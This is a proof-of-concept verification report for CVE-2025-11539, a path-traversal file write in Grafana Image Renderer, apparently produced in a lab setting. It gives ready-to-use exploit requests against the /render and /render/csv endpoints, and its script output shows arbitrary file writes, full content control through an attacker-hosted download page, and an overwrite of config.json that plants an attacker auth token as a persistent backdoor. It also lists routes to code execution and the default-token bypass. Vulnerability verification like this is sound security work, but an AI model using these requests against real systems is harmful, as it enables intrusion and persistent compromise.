# PoC Verification Report: CVE-2025-11539

## Verification Status: ✅ CONFIRMED

All three attack vectors were successfully exploited against the vulnerable Grafana Image Renderer v4.0.16.

## CVE Summary

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2025-11539 |
| **Vulnerability** | Arbitrary File Write via Path Traversal |
| **Affected Software** | Grafana Image Renderer 1.0.0 through 4.0.16 |
| **CVSS** | 9.9 (Critical) |
| **CWE** | CWE-94 — Improper Control of Generation of Code / Code Injection |

## PoC Scripts

### Vector 1: `/render` Endpoint — Arbitrary File Write (Screenshot)

| Field | Value |
|-------|-------|
| **Script** | `poc/poc.py` |
| **Endpoint** | `GET /render` |
| **Content Control** | Limited (PNG screenshot of attacker-chosen URL) |
| **Status** | ✅ CONFIRMED |
| **Complexity** | Trivial — single HTTP GET request |

**Description**: The `/render` endpoint accepts a `filePath` query parameter that is passed directly to Puppeteer's `page.screenshot({ path: options.filePath })` without any path validation. An attacker can write a PNG screenshot to any writable path on the filesystem.

**Command**:
```bash
cd poc/
python3 poc.py
```

**Output**:
```
[*] Auto-detected renderer IP: 172.19.0.7

======================================================================
  CVE-2025-11539 PoC — Arbitrary File Write via /render
======================================================================
  Target:     172.19.0.7:8081
  Container:  cve-2025-11539-renderer
  Auth Token: -
  Write Path: /tmp/cve-2025-11539-poc-cba2859b.png
  URL:        http://cve-2025-11539-grafana:3000/login
======================================================================

[*] Step 1: Starting file watcher inside container...
[*] Step 2: Sending exploit request to /render endpoint...
    GET /render?url=http://cve-2025-11539-grafana:3000/login&filePath=/tmp/cve-2025-11539-poc-cba2859b.png&width=100&height=100&timeout=30
    X-Auth-Token: -

[+] Response: HTTP 200, Content-Type: image/png, Body size: 3625 bytes

[*] Step 3: Waiting for file watcher to detect the written file...

[+] ═══════════════════════════════════════════════════════════
[+]  VULNERABILITY CONFIRMED — Arbitrary File Write Succeeded!
[+] ═══════════════════════════════════════════════════════════

    FILE_FOUND
    -rw-r--r-- 1 root root 3625 Feb 28 18:01 /tmp/cve-2025-11539-poc-cba2859b.png
    /tmp/cve-2025-11539-poc-cba2859b.png: PNG image data, 100 x 100, 8-bit/color RGB, non-interlaced
    EVIDENCE_SAVED:/tmp/cve-2025-11539-poc-cba2859b.evidence.png

[+] The renderer wrote a PNG screenshot to /tmp/cve-2025-11539-poc-cba2859b.png
[+] This path was supplied by the attacker via the filePath parameter
[+] No path validation was performed — ANY writable path is reachable

[+] Impact: An attacker can write files to arbitrary locations
[+]         on the renderer's filesystem, enabling:
[+]           - Overwriting application code for RCE on restart
[+]           - Overwriting config files
[+]           - Writing malicious shared libraries loaded by Chromium
```

---

### Vector 2: `/render/csv` Endpoint — Full Content Control

| Field | Value |
|-------|-------|
| **Script** | `poc/poc_vector2.py` |
| **Endpoint** | `GET /render/csv` |
| **Content Control** | **Full** — attacker controls both content and destination |
| **Status** | ✅ CONFIRMED |
| **Complexity** | Moderate — requires attacker-hosted HTTP server |

**Description**: The `/render/csv` endpoint navigates Chromium to a URL and waits for a file download. The downloaded file is then copied to the attacker-controlled `filePath` via `fs.copyFileSync()`. By hosting a page that triggers a download of arbitrary content, the attacker achieves full content control over the written file.

The PoC:
1. Starts an HTTP server serving an HTML page with JavaScript that creates a Blob download
2. Sends `/render/csv` with `url` pointing to the attacker server and `filePath` with traversal
3. Verifies the file content matches a canary string (proving exact content control)

**Command**:
```bash
cd poc/
python3 poc_vector2.py
```

**Output**:
```
[*] Auto-detected renderer IP: 172.19.0.7

======================================================================
  CVE-2025-11539 PoC — Full Content Control via /render/csv
======================================================================
  Target:         172.19.0.7:8081
  Container:      cve-2025-11539-renderer
  Auth Token:     -
  Write Path:     /tmp/cve-2025-11539-csv-poc-efdfa6a8.bin
  Attacker Server: 172.19.0.3:18081
  Canary String:  CVE-2025-11539-FULL-CONTENT-CONTROL-PROOF-efdfa6a8
======================================================================

[*] Step 1: Starting attacker HTTP server...
    Listening on 0.0.0.0:18081
    /trigger-download — HTML page triggering blob download
    /direct-download  — Direct file download via Content-Disposition

[*] Step 2: Starting file watcher inside container...

[*] Step 3: Sending exploit request to /render/csv...
    GET /render/csv?url=http://172.19.0.3:18081/trigger-download&filePath=/tmp/cve-2025-11539-csv-poc-efdfa6a8.bin&timeout=30
    X-Auth-Token: -

    [Attacker Server] GET /trigger-download HTTP/1.1
    [Attacker Server] GET /favicon.ico HTTP/1.1
[+] Response: HTTP 200, Content-Type: application/octet-stream, Body size: 50 bytes
[+] Response body contains canary string — file was written and returned

[*] Step 4: Waiting for file watcher to verify content...

[+] ═══════════════════════════════════════════════════════════════
[+]  FULL CONTENT CONTROL CONFIRMED!
[+]  Attacker-controlled content written to arbitrary path
[+] ═══════════════════════════════════════════════════════════════

    FILE_FOUND
    -rw-r--r-- 1 root root 50 Feb 28 18:01 /tmp/cve-2025-11539-csv-poc-efdfa6a8.bin
    /tmp/cve-2025-11539-csv-poc-efdfa6a8.bin: ASCII text, with no line terminators
    ---CONTENT_START---
    CVE-2025-11539-FULL-CONTENT-CONTROL-PROOF-efdfa6a8---CONTENT_END---

[+] Expected canary: CVE-2025-11539-FULL-CONTENT-CONTROL-PROOF-efdfa6a8
[+] File content:    CVE-2025-11539-FULL-CONTENT-CONTROL-PROOF-efdfa6a8
[+] Content match:   ✓ EXACT MATCH

[+] Impact: The attacker controls BOTH the file content AND the path.
[+]         This enables:
[+]           - Writing malicious .so libraries for RCE via Chromium
[+]           - Overwriting Node.js source files with backdoors
[+]           - Replacing config.json to change auth tokens
[+]           - Any arbitrary file write with chosen binary content
```

---

### Vector 3: Config Overwrite — Persistent Backdoor

| Field | Value |
|-------|-------|
| **Script** | `poc/poc_vector3.py` |
| **Endpoint** | `GET /render/csv` |
| **Target Path** | `/app/config.json` (absolute path — no traversal needed) |
| **Status** | ✅ CONFIRMED |
| **Complexity** | Moderate — requires attacker-hosted HTTP server |

**Description**: Demonstrates a realistic exploitation scenario where the attacker overwrites the application's `config.json` to replace the authentication token with an attacker-controlled value. This creates a persistent backdoor — after service restart, only the attacker's token authenticates.

This variant uses an **absolute path** (`/app/config.json`) instead of relative path traversal (`../../app/config.json`), proving that both approaches work since no path validation exists.

**Command**:
```bash
cd poc/
python3 poc_vector3.py
```

**Output**:
```
[*] Auto-detected renderer IP: 172.19.0.7

======================================================================
  CVE-2025-11539 PoC — Config Overwrite via /render/csv
======================================================================
  Target:         172.19.0.7:8081
  Container:      cve-2025-11539-renderer
  Auth Token:     -
  Config Target:  /app/config.json
  Attacker Token: ATTACKER-CONTROLLED-TOKEN-CVE-2025-11539
======================================================================

[*] Step 1: Reading original config.json...
    Original authToken: -

[*] Step 2: Starting attacker HTTP server with malicious config...
    Listening on 0.0.0.0:18082

[*] Step 3: Starting config file watcher...
[*] Step 4: Sending exploit request...
    GET /render/csv?url=http://172.19.0.3:18082/trigger-download&filePath=/app/config.json&timeout=30
    X-Auth-Token: -

    [Attacker Server] GET /trigger-download HTTP/1.1
    [Attacker Server] GET /favicon.ico HTTP/1.1
[+] Response: HTTP 200, Body size: 1032 bytes

[*] Step 5: Checking if config was overwritten...

[+] ═══════════════════════════════════════════════════════════════
[+]  CONFIG OVERWRITE CONFIRMED!
[+]  Application auth token replaced with attacker-controlled value
[+] ═══════════════════════════════════════════════════════════════

    Original token:  -
    New token:       ATTACKER-CONTROLLED-TOKEN-CVE-2025-11539

[+] Impact: After service restart, the attacker's token authenticates
[+]         all requests. The original token is invalidated.
[+]         This is a persistent backdoor into the renderer service.

[*] Restoring original config.json (lab cleanup)...
    Original config restored.
```

---

## Vulnerability Demonstrated

The PoC proves the following:

1. **Path traversal via `filePath` parameter**: Both absolute paths and relative traversal work. No validation is performed on the parameter before it reaches `fs.copyFileSync()` or `page.screenshot()`.

2. **Two independent entry points**: Both `/render` and `/render/csv` endpoints pass `req.query.filePath` directly to file I/O without sanitization.

3. **Full content control** (via `/render/csv`): By hosting a malicious download page, the attacker controls exactly what binary content is written to the target path. This was proven with an exact canary string match.

4. **Realistic impact** (config overwrite): The attacker can overwrite `config.json` to change the auth token, creating a persistent backdoor.

5. **Trivial authentication bypass**: The default auth token (`-`) is configured in `default.json` and known to all users who read the source code or documentation.

## Authentication Details

| Field | Value |
|-------|-------|
| **Header** | `X-Auth-Token` |
| **Default Value** | `-` (single hyphen) |
| **Config Location** | `default.json` → `service.security.authToken` |
| **Validation** | Exact string match in `authTokenMiddleware` |

## File Cleanup Behavior

Both endpoints delete the file after sending the HTTP response:
- `/render`: `fs.unlinkSync(result.filePath)` in the `sendFile` callback
- `/render/csv`: `fs.unlink(result.filePath, ...)` in the `sendFile` callback

This means files exist only briefly at the target path. However:
1. The vulnerability is the write primitive itself — even transient writes enable exploitation
2. For RCE via shared library injection, the `.so` file is loaded by Chromium **during** the render (before cleanup)
3. For config overwrite, the file persists if the cleanup path differs from the write path
4. Evidence was captured using filesystem watchers and copied to persistent evidence paths

## Lab Environment

| Container | Role | Network |
|-----------|------|---------|
| `cve-2025-11539-renderer` | Vulnerable target | lab-net |
| `cve-2025-11539-grafana` | Dashboard | lab-net |

## Dependencies

All PoC scripts use **Python 3 stdlib only** — no external dependencies:
- `urllib.request` / `urllib.error` — HTTP requests
- `http.server` / `socketserver` — Attacker HTTP server (vectors 2 and 3)
- `subprocess` — Docker exec for file verification
- `threading` — Background file watchers and HTTP server
- `json` — Config parsing
- `uuid` — Unique file names to avoid collisions

## Notes

1. **No public exploits existed** prior to this PoC — written from scratch based on vulnerability analysis
2. **Three distinct attack vectors** were tested, all using different techniques:
   - Vector 1: Screenshot write via `/render` (limited content, simplest)
   - Vector 2: Full content write via `/render/csv` with blob download (full content control)
   - Vector 3: Config overwrite via `/render/csv` with absolute path (realistic impact)
3. The gRPC entry point (`grpc_plugin.ts`) was not tested as it requires gRPC client setup and is primarily an internal interface
4. The PoC scripts auto-detect the renderer IP via `docker inspect` — no manual configuration needed
